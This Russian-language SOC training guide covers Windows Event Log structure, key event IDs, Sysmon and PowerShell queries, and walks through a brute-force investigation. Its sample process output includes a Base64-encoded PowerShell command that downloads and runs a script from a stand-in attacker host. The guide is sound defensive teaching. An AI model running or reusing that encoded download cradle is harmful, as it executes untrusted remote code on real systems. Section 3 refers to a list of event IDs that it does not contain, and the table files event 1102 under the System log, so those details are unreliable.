# Ключевые события Windows

## 1. Журнал событий как источник данных для аналитика SOC

Windows Event Log — это встроенная подсистема операционных систем Windows, фиксирующая события, связанные с работой системы, приложений и механизмов безопасности. Для специалиста SOC первого уровня журнал событий является первичным источником телеметрии, позволяющим выявлять аномалии, подтверждать факт инцидента и восстанавливать хронологию действий злоумышленника [Decoding Windows event logs: A definitive guide for incident responders](https://www.hackthebox.com/blog/decoding-windows-event-logs-a-definitive-guide-for-incident-responders). Каждая запись (событие) имеет числовой идентификатор Event ID, фиксированный набор полей и временную метку. Именно Event ID служит главным признаком при фильтрации и корреляции событий.

**Категории журналов.** Операционная система распределяет события по нескольким предопределённым контейнерам — журналам. Согласно документации Microsoft и отраслевым руководствам, выделяют пять основных категорий [What is a Windows event log and why should SOC analysts track it](https://www.manageengine.com/log-management/cyber-security/soc/windows-event-log-and-why-soc-analysts-should-track-it.html):

- **System** — события компонентов ядра, драйверов, служб (ошибки инициализации, сбои памяти).
- **Application** — записи от пользовательских приложений и служб (ошибки запуска, информационные сообщения).
- **Security** — события, связанные с аудитом безопасности (входы, доступ к объектам, изменение политик). Именно этот журнал наиболее активно используется в SOC-расследованиях.
- **Setup** — события установки обновлений и ролей системы (появился в Windows Server 2008 и клиентских ОС нового поколения).
- **Forwarded Events** — события, пересланные с других компьютеров через механизм Windows Event Forwarding; централизованная точка сбора.

**Типы событий.** Каждая запись имеет уровень серьёзности, который помогает быстро оценить критичность [What is a Windows event log and why should SOC analysts track it](https://www.manageengine.com/log-management/cyber-security/soc/windows-event-log-and-why-soc-analysts-should-track-it.html):

- *Error* — существенная проблема (отказ службы, потеря данных).
- *Warning* — потенциально опасное состояние, которое может привести к ошибке в будущем (нехватка места на диске, устаревший драйвер).
- *Information* — штатное событие, описывающее успешное действие (запуск службы, применение политики).
- *Success Audit* — успешное событие, зарегистрированное по правилам аудита безопасности (успешный вход).
- *Failure Audit* — неудачное событие аудита безопасности (отказ в доступе, неверный пароль).

Для SOC наиболее информативны события аудита успеха и отказа из журнала Security, а также предупреждения и ошибки из System, способные указать на сбои защитных механизмов.

Сравнительная характеристика категорий журналов приведена в таблице.

| Категория журнала | Основное назначение | Примеры записей, важных для SOC |
|-------------------|---------------------|----------------------------------|
| Security | Аудит безопасности, попытки доступа, изменение политик | 4624 (успешный вход), 4625 (неудачный вход), 4688 (создание процесса) |
| System | Состояние системных компонентов, драйверов, оборудования | 7045 (установка службы), 1102 (очистка журнала безопасности) |
| Application | События приложений, записанные разработчиками | Ошибки веб-серверов, антивирусных продуктов |
| Setup | Ход установки обновлений и компонентов ОС | Завершение установки обновления, ошибка конфигурации |
| Forwarded Events | Зеркало событий с удалённых узлов | Агрегированные события безопасности, используемые в SIEM |

**Роль в SOC-цикле.** Журнал событий используется на всех этапах — от детектирования (по готовым сигнатурам ID) до ретроспективного поиска угроз (threat hunting) и сбора доказательной базы. Знание ключевых идентификаторов позволяет аналитику за секунды оценить характер активности: например, множество событий 4625 (failed logon) с одного источника за короткий промежуток времени — вероятный признак атаки методом перебора паролей. При этом важно понимать ограничения: локальные журналы могут быть очищены (событие 1102), перезаписаны из-за недостаточного размера или вообще не содержать нужных полей без предварительно настроенной расширенной политики аудита. Поэтому в корпоративных средах данные часто централизуются в SIEM или дублируются с помощью Sysmon — драйвера, перехватывающего низкоуровневые события и обогащающего телеметрию хешами, полными командными строками и сетевой активностью [Windows Event IDs for SOC Analysts: A Quick Guide - LinkedIn](https://www.linkedin.com/posts/neha-sharma-310384240_soc-siem-cybersecurity-activity-7367138870611615744-6Jd6).

Таким образом, Windows Event Log — не просто хроника системы, а обязательный элемент архитектуры мониторинга безопасности, эффективность которого напрямую зависит от конфигурации аудита и интеграции со смежными источниками.

## 2. Архитектура и структура журналов событий

**Формат хранения.** Начиная с Windows Vista и Windows Server 2008, события записываются в бинарные файлы с расширением `.evtx`, расположенные по умолчанию в `%SystemRoot%\System32\winevt\Logs\`. Каждый файл содержит записи, логическая структура которых описана на языке XML, но для экономии места сериализована в проприетарный бинарный формат. Благодаря этому даже при повреждении части файла отдельные записи могут быть восстановлены. При ручном разборе утилиты вроде Event Viewer или PowerShell-командлет `Get-WinEvent` выполняют десериализацию и представляют данные в читаемом виде [Криминалистический анализ журнала событий Windows Event Log](https://blog.elcomsoft.ru/2026/02/kriminalisticheskij-analiz-zhurnala-sobytij-windows-event-log/).

**Структура записи.** Каждое событие состоит из заголовка и тела (EventData). Заголовок содержит:
- **Event ID** — уникальный числовой идентификатор типа события (например, 4624).
- **Provider** — источник, зарегистрировавший событие (например, `Microsoft-Windows-Security-Auditing`).
- **Level** — уровень серьёзности (Error, Warning и т. д.).
- **Keywords** — битовая маска классификации (аудит успеха, отказа).
- **TimeCreated** — временная метка в UTC.
- **User** — SID пользователя, от имени которого событие записано (для системных событий часто `S-1-5-18`).

Тело (EventData) содержит набор пар «имя-значение», специфичных для каждого Event ID. Например, событие 4624 (успешный вход) обязательно включает поля `TargetUserName`, `TargetDomainName`, `LogonType` (код типа входа: 2 – интерактивный, 3 – сетевой, 10 – удалённый интерактивный и др.), `IpAddress`, `WorkstationName`. Иллюстративная схема структуры XML для типового события безопасности:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="..."/>
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2025-04-01T08:30:00.0000000Z"/>
    <Correlation/>
    <Execution ProcessID="..." ThreadID="..."/>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="TargetUserName">jdoe</Data>
    <Data Name="TargetDomainName">CONTOSO</Data>
    <Data Name="LogonType">10</Data>
    <!-- другие поля --> 
  </EventData>
</Event>
```

**Каналы и категории аудита.** Помимо стандартных «контейнеров» (Windows Logs), существуют каналы в разделе «Applications and Services Logs», которые делятся на *Administrative* (события, адресованные администратору), *Operational* (потоковая диагностика), *Analytic* (очень детальные, по умолчанию отключены) и *Debug*. Для SOC наиболее ценны Operational-каналы Sysmon, PowerShell, Terminal Services и др. Включение расширенной политики аудита через `secpol.msc` или групповые политики позволяет регистрировать детальные события аудита безопасности (например, Audit Process Creation для появления 4688, Audit Logon Events для 4624/4625). Без явной настройки многие критически важные события попросту не попадают в журнал.

**Ограничения и Sysmon.** Стандартный журнал Security фиксирует создание процесса событием 4688, но содержит лишь базовый набор полей: имя исполняемого файла, ID процесса, иногда командную строку (при включённой политике). Этого недостаточно для выявления многих техник злоумышленников, особенно использующих легитимные утилиты (Living-off-the-Land Binaries, LoLBins). Sysmon (System Monitor) — компонент из набора Sysinternals, который устанавливает драйвер уровня ядра и предоставляет значительно более детальную телеметрию [Windows Event Logging Explained: A SOC Analyst's Guide to Log ...](https://medium.com/@lokeshacharya/windows-event-logging-explained-a-soc-analysts-guide-to-log-analysis-24333751ec9b). Его ключевые идентификаторы событий:

- *Event ID 1: Process creation* — полная командная строка, хеш (MD5/SHA1/SHA256), путь к исполняемому файлу, родительский процесс, GUID процесса.
- *Event ID 3: Network connection* — исходящие TCP/UDP-соединения с привязкой к процессу (важно для обнаружения C2-каналов).
- *Event ID 7: Image loaded* — загрузка DLL в процесс (помогает выявить DLL Hijacking, инъекции).
- *Event ID 11: FileCreate* — создание файла с указанием процесса.

В SOC-среде Sysmon практически всегда дополняет встроенный аудит, и при анализе инцидентов аналитики часто обращаются именно к его каналам.

Визуальная схема компонентов журналирования Windows (упрощённо):

```text
[Источники событий]
   │
   ├─ Ядро ОС, драйверы ──▶ System Log (.evtx)
   ├─ Приложения ──▶ Application Log (.evtx)
   ├─ LSASS.exe, SAM, подсистема аудита ──▶ Security Log (.evtx)
   └─ Sysmon Driver (sys) ──▶ Microsoft-Windows-Sysmon/Operational (.evtx)

[Сервис Event Log Service]
   │
   ├─ API (EvtSubscribe, EvtQuery)
   ├─ Event Viewer (eventvwr.msc)
   ├─ PowerShell (Get-WinEvent)
   ├─ Windows Event Forwarding (WEF)
   └─ SIEM-агенты / EDR
```

Понимание этой архитектуры позволяет корректно интерпретировать источник события и оценивать его достоверность.

## 3. Ключевые события Windows для мониторинга и реагирования

Набор идентификаторов, который обязан знать аналитик SOC L1, определяется векторами атак, наиболее часто наблюдаемыми в реальных инцидентах. Операционная система способна генерировать гораздо более широкий спектр событий, однако приведённые идентификаторы составляют обязательный минимум для первичного анализа. При расследовании аналитик стремится восстановить так называемую «историю» инцидента: сопоставить неудачные входы (4625) с последующим успешным (4624), проверить повышение привилегий (4672), факт запуска процесса (4688) и возможную установку persistence (7045). Использование Sysmon позволяет углубить анализ за счёт хешей и сетевых соединений, а события 5140/5145 помогают доказать факт несанкционированного доступа к файлам.

## 4. Применение и работа с журналом событий на практике

**Локальный анализ.** Самый быстрый способ просмотра событий — встроенная оснастка Event Viewer (`eventvwr.msc`). Аналитик может отфильтровать текущий журнал по коду события или создать пользовательское представление. Однако в условиях SOC ручной перебор записей неэффективен, поэтому основным инструментом становится PowerShell с командлетом `Get-WinEvent`. Он позволяет выполнять гибкую фильтрацию по хеш-таблице параметров или с помощью XPath-запросов, а также экспортировать результаты в CSV. Пример получения всех неудачных входов за последний час:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    ID        = 4625
    StartTime = (Get-Date).AddHours(-1)
} | Format-List TimeCreated, Id, @{
    Name = 'TargetUser'; Expression = {$_.Properties[5].Value}
}, @{
    Name = 'LogonType'; Expression = {$_.Properties[10].Value}
}, @{
    Name = 'SourceIP'; Expression = {$_.Properties[18].Value}
}
```

Вывод такой команды содержит поле `TargetUser` (учётная запись, под которую пытались войти), `LogonType` (код 3 — сетевой, 10 — RDP) и `SourceIP`. Множество записей с одинаковым IP и разными именами пользователей — явный признак атаки перебором.

Для анализа создаваемых процессов (Event ID 4688) с получением командной строки (при условии, что аудит командной строки включён) используют:

```powershell
Get-WinEvent -FilterHashTable @{LogName='Security'; ID=4688; StartTime='2025-04-01T08:00:00'} |
    Select-Object TimeCreated,
        @{n='NewProcess';e={$_.Properties[5].Value}},
        @{n='CommandLine';e={$_.Properties[8].Value}},
        @{n='ParentProcess';e={$_.Properties[14].Value}}
```

Если же используется Sysmon, аналогичная информация извлекается из канала `Microsoft-Windows-Sysmon/Operational`:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=1]]" -MaxEvents 10 |
    ForEach-Object {
        [xml]$xml = $_.ToXml()
        $data = @{}
        $xml.Event.EventData.Data | ForEach-Object { $data[$_.Name] = $_.'#text' }
        [PSCustomObject]@{
            Time      = $_.TimeCreated
            Image     = $data['Image']
            CommandLine = $data['CommandLine']
            ParentImage = $data['ParentImage']
        }
    }
```

**Централизованный сбор и корреляция.** В средах, где развёрнут SIEM (Splunk, Elastic, Microsoft Sentinel), события с конечных точек пересылаются агентами в реальном времени. Это позволяет централизованно применять правила корреляции: например, пороговое правило на количество 4625 за 5 минут, комбинированное с отсутствием одобрения. Аналитик SOC L1, получив алерт, открывает панель SIEM и визуально анализирует агрегированную последовательность событий с привязкой к конкретному хосту. Навык работы с фильтрами SIEM (указание временного окна, Event ID, имени хоста) — обязательная компетенция.

**Типичные ошибки и подводные камни.** Начинающие аналитики часто игнорируют поле `LogonType` для 4624/4625, путая интерактивный вход с сетевым. Событие 4624 с типом 3 (network) не обязательно означает вход на сам компьютер — оно может фиксировать простую проверку учётных данных при доступе к сетевому ресурсу. Другая распространённая ошибка — считать любое изменение пароля (4723/4724) инцидентом: в доменной среде смена пароля пользователем происходит регулярно, и только аномальное время или связка с созданием учётной записи должны вызывать подозрение. Кроме того, отсутствие нужных событий часто объясняется отключённым аудитом, поэтому в начале расследования всегда стоит проверить состояние политики аудита (`auditpol /get /category:*`).

## Сквозной практический пример: обнаружение и расследование атаки перебором паролей

### Исходные условия

Рабочее место аналитика SOC L1: доступ к консоли Windows Server 2022 с правами локального администратора, средство анализа — PowerShell. В SIEM поступил алерт о резком всплеске неудачных попыток входа (Event ID 4625) с хоста `SRV-DC01` (источник) на рабочую станцию `WS-Prod-27`. Задача — подтвердить атаку, определить, была ли она успешной, и зафиксировать шаги для передачи на следующий уровень (L2).

### Шаг 1. Оценка масштаба неудачных попыток

Запросим статистику попыток входа с группировкой по целевой учётной записи и исходному IP.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    ID        = 4625
    StartTime = (Get-Date).AddHours(-2)
} | Group-Object -Property {
    $_.Properties[5].Value  # TargetUserName
}, {
    $_.Properties[18].Value # IpAddress
} | Select-Object Count, Name | Sort-Object Count -Descending
```

Иллюстративный вывод (значения зависят от среды):

```
Count Name
----- ----
  850 administrator, 10.20.30.44
   12 guest, 10.20.30.44
    3 jdoe, 10.20.30.44
```

Интерпретация: 850 неудачных попыток для учётной записи `administrator` с одного IP за два часа — классический признак инструментального перебора.

### Шаг 2. Проверка успешного входа

Ищем события 4624 для той же учётной записи и того же источника сразу после окончания волны неудач.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    ID        = 4624
    StartTime = (Get-Date).AddHours(-2)
} | Where-Object {
    $_.Properties[5].Value -eq 'administrator' -and $_.Properties[18].Value -eq '10.20.30.44'
} | Select-Object TimeCreated,
    @{n='TargetUser';e={$_.Properties[5].Value}},
    @{n='LogonType';e={$_.Properties[8].Value}},
    @{n='SourceIP';e={$_.Properties[18].Value}} |
    Format-Table -AutoSize
```

Ожидаемый вывод:

```
TimeCreated           TargetUser    LogonType SourceIP
-----------           ----------    --------- --------
01.04.2025 12:04:17   administrator 10       10.20.30.44
```

Тип входа 10 (RemoteInteractive) означает RDP-подключение. С этого момента учётная запись `administrator` скомпрометирована.

### Шаг 3. Анализ процессов после успешного входа

Проверим, какие процессы были созданы (стандартный аудит 4688) в сессии, начавшейся в это время.

```powershell
Get-WinEvent -FilterHashTable @{
    LogName   = 'Security'
    ID        = 4688
    StartTime = '2025-04-01T12:04:00'
    EndTime   = '2025-04-01T12:15:00'
} | Select-Object TimeCreated,
    @{n='NewProcess';e={$_.Properties[5].Value}},
    @{n='CommandLine';e={$_.Properties[8].Value}}
```

(Примечание: CommandLine доступна только при активированном аудите командной строки.)  
Типичный результат:

```
TimeCreated           NewProcess       CommandLine
-----------           ----------       -----------
01.04.2025 12:05:10   cmd.exe          cmd.exe /c whoami
01.04.2025 12:05:22   powershell.exe   powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBwAC4AdAB4AHQAJwApAA==
```

Запуск `cmd.exe` для разведки, затем PowerShell с обфусцированной командой (Base64) для загрузки внешнего ресурса — очевидные признаки действий злоумышленника.

### Шаг 4. Проверка латерального перемещения

Ищем события 4648 (явные учётные данные) за тот же промежуток — злоумышленник мог попытаться подключиться к другим системам.

```powershell
Get-WinEvent -FilterHashTable @{
    LogName   = 'Security'
    ID        = 4648
    StartTime = '2025-04-01T12:00:00'
    EndTime   = '2025-04-01T12:20:00'
} | Format-List TimeCreated,
    @{n='SubjectUser';e={$_.Properties[1].Value}},
    @{n='TargetOutboundUser';e={$_.Properties[5].Value}},
    @{n='TargetServer';e={$_.Properties[6].Value}}
```

Иллюстративный вывод:

```
TimeCreated : 01.04.2025 12:06:45
SubjectUser : WS-PROD-27\administrator
TargetOutboundUser : SRV-FILE\Administrator
TargetServer : SRV-FILE
```

Это указывает на попытку подключения к файловому серверу с использованием локальной учётной записи `Administrator`. Дальнейший анализ журнала Security на целевых хостах (Event ID 5140/5145) подтвердит факт доступа к шарам.

### Ожидаемый вывод

Пример демонстрирует полный цикл расследования типового инцидента, начиная от первичного алерта и заканчивая формированием доказательной базы для эскалации. Закреплённый материал позволяет аналитику SOC L1 отличать рядовые неудачные попытки от целенаправленной атаки, выявлять успешную компрометацию и отслеживать продвижение злоумышленника внутри сети.
